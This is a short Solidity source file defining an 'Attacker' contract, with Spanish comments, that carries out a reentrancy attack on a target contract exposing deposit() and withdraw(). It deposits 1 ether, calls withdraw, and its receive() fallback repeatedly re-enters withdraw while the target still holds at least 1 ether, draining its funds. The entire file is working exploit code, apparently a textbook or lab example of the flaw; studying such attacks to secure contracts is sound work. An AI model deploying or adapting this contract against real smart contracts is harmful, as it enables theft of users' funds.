pragma solidity ^0.8.13;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerable public target;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    // iniciar ataque
    function attack() external payable {
        require(msg.value >= 1 ether);

        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    // fallback: se ejecuta cuando recibe ETH
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
